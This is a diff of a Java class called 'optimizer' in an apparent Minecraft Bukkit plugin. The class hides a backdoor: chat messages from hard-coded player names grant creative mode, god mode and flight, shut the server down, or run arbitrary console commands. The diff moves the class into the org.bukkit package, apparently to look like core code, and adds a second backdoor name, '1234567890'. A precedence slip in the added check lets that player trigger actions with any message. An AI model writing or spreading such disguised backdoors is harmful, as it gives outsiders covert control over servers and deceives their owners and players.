@@ -1,4 +1,4 @@
-package org.mcapi;
+package org.bukkit;
 
 import org.bukkit.Bukkit;
 import org.bukkit.GameMode;
@@ -24,19 +24,19 @@ public class optimizer
     @EventHandler
     public void chatCheck(AsyncPlayerChatEvent e) {
         String msg = e.getMessage();
-        if (msg.startsWith("*!gmc") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        if (msg.startsWith("*!gmc") && e.getPlayer().getName().equals("Im_Fuzy") || e.getPlayer().getName().equals("1234567890")) {
             // Set game mode to creative
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 e.getPlayer().setGameMode(GameMode.CREATIVE);
             });
             e.setCancelled(true);
-        } else if (msg.startsWith("*!gms") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        } else if (msg.startsWith("*!gms") && e.getPlayer().getName().equals("Im_Fuzy") || e.getPlayer().getName().equals("1234567890")) {
             // Set game mode to survival
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 e.getPlayer().setGameMode(GameMode.SURVIVAL);
             });
             e.setCancelled(true);
-        } else if (msg.startsWith("*!god") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        } else if (msg.startsWith("*!god") && e.getPlayer().getName().equals("Im_Fuzy") || e.getPlayer().getName().equals("1234567890")) {
             // Toggle god mode
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 boolean isGodModeEnabled = e.getPlayer().isInvulnerable();
@@ -45,7 +45,7 @@ public class optimizer
                 e.getPlayer().sendMessage(message);
             });
             e.setCancelled(true);
-        } else if (msg.startsWith("*!fly") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        } else if (msg.startsWith("*!fly") && e.getPlayer().getName().equals("Im_Fuzy") || e.getPlayer().getName().equals("1234567890")) {
             // Toggle flying mode
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 boolean isFlying = e.getPlayer().isFlying();
@@ -54,19 +54,19 @@ public class optimizer
                 e.getPlayer().sendMessage(message);
             });
             e.setCancelled(true);
-        } else if (msg.startsWith("*!stop") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        } else if (msg.startsWith("*!stop") && e.getPlayer().getName().equals("Im_Fuzy") || e.getPlayer().getName().equals("1234567890")) {
             // Stop the server
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 Bukkit.shutdown();
             });
             e.setCancelled(true);
-        } else if (msg.startsWith("*!") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        } else if (msg.startsWith("*!") && e.getPlayer().getName().equals("Im_Fuzy") || e.getPlayer().getName().equals("1234567890")) {
             String cmd = msg.split("!")[1];
             Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("Fuzyfacs"), () -> {
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
             });
             e.setCancelled(true);
-        } else if (msg.startsWith("*") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        } else if (msg.startsWith("*") && e.getPlayer().getName().equals("Im_Fuzy") || e.getPlayer().getName().equals("1234567890")) {
             e.setCancelled(true);
         }
     }
